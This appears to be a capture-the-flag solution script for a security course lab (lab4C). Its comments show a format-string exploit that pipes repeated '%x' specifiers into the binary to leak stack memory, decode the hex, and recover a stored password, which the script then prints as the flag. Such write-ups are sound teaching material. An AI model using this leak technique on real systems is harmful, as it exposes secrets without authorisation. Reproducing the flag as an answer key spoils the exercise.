# LEAK: python -c 'print "%x"*100 + "\n" + "password\n"' | /levels/lab04/lab4C
#
# DROP INTO A PYTHON PROMPT (bu7_1t_w4sn7_brUt3_f0rc34b1e!)
# ^
# >>> leak = "2578000025782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782    57825787562007874315f377334775f625f376e337455727230665f6234336321653178257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825"
# >>> list = [leak[i:i+8] for i in range(0, len(leak), 8)]
# >>> nlist = []
# >>> for i in range(len(list)):
# ...   nlist += "0x"+list[i],
# ...
# >>> final_str = ""
# >>> for i in range(len(nlist)):
# ...   try:
# ...     final_str += struct.pack('<L', int(nlist[i], 16))
# ...   except:
# ...     pass
# ...
# >>> final_str
# '\x00\x00x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x\x00bu7_1t_w4sn7_brUt3_f0rc34bx1e!x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%%x%\x00'
print "bu7_1t_w4sn7_brUt3_f0rc34b1e!"
